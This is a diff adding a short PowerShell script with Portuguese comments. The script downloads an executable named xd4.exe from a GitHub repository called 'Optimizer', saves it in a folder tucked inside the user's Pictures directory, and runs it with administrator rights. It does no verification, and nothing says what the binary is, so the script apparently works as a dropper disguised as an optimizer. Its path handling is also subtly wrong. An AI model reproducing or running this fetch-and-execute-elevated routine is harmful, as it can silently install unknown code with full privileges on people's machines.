@@ -1,0 +1,16 @@
+# URL do novo arquivo a ser baixado
+$url = "https://github.com/devmenzin/Optimizer/raw/main/xd4.exe"
+
+# Determinar o diretório de imagens do usuário
+$diretorioImagens = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("MyPictures"), "xd4.exe")
+
+# Criar a pasta OTZTEMP dentro do diretório de imagens
+$pastaOTZTEMP = [System.IO.Path]::Combine($diretorioImagens, "OTZTEMP")
+New-Item -ItemType Directory -Path $pastaOTZTEMP -Force
+
+# Baixar o arquivo
+$arquivoBaixado = [System.IO.Path]::Combine($pastaOTZTEMP, "xd4.exe")
+Invoke-WebRequest -Uri $url -OutFile $arquivoBaixado
+
+# Executar o arquivo baixado como administrador
+Start-Process -FilePath $arquivoBaixado -Verb RunAs
